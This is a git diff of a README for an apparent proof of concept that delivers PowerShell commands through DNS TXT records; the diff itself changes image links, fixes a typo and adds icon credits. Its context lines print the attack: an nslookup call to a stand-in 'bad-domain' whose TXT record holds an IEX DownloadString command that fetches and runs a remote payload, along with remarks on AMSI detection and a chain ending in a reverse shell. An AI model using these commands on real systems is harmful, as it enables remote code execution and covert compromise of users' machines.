@@ -8,7 +8,8 @@ DNS Server TXT entry:<br>
 
 The outcome is `powershell ping google.com` being executed in the current session on the clients system.
 
-![GRAPHIC_1](https://github.com/Dood3/PoCs/assets/93183445/ed4ab94c-44fa-4cde-924b-10f26ebbc169)
+![GRAPHIC_1](https://github.com/Dood3/PoCs/assets/93183445/f50b4ce4-602b-4005-82a2-e49179797da8)
+
 
 
 ### Variant 0.2
@@ -21,7 +22,8 @@ DNS Server TXT entry:<br>
 The file hosting the payload is not bound to any file formats. A simple file without suffix will work. 
 This request will probably trigger AV (AMSI). If "IEX" doesn't get caught, the delivered payload itself most likely will.*<br>
 
- ![GRAPHIC_2](https://github.com/Dood3/PoCs/assets/93183445/b9052342-258e-4e92-8559-abdec97e44b8)
+![GRAPHIC_2](https://github.com/Dood3/PoCs/assets/93183445/6295abaa-581a-4a33-98fe-ce553b699eca)
+
 
 
 ### Variant 0.3
@@ -32,7 +34,7 @@ DNS Server TXT entry (the index may vary):<br>
 `powershell (nslookup -q=txt bad-domain2.com)[5]`<br><br>
 DNS Server TXT entry on bad-domain_2.com:<br>
 `IEX (New-Object Net.WebClient).DownloadString('http:/server/payload.html')`<br><br>
-*EXPLANATION: The commands can be chained together with a combination of dns servers. The client requests the first domain, which in return requests the actual commands.on the second server.*<br>
+*EXPLANATION: The commands can be chained together with a combination of dns servers. The client requests the first domain, which in return requests the actual commands on the second server.*<br>
 This will most likely trigger AV (AMSI).<br>
 
 1. `powershell (nslookup -q=txt bad-domain.com)[5]`<br>
@@ -40,5 +42,13 @@ This will most likely trigger AV (AMSI).<br>
 3. `Command gets delivered to Client (over dns)`<br>
 4. `Reverse shell phoning home`<br>
 
-  ![GRAPHIC_3](https://github.com/Dood3/PoCs/assets/93183445/3243575e-8f56-478b-bf27-f3a1d4788557)
+![GRAPHIC_3](https://github.com/Dood3/PoCs/assets/93183445/a788e181-a486-44da-8237-c5dffc8b863b)
+<br><br><br><br><br><br><br>
+
+
+*Icons:*<br>
+<font size=”1”>
+https://www.flaticon.com/free-icons/computer  <br>
+https://icons8.com/icon/set/firewall-png/glyph-neue <br>
+https://icons8.com/icons/set/computer <br> </font>
 
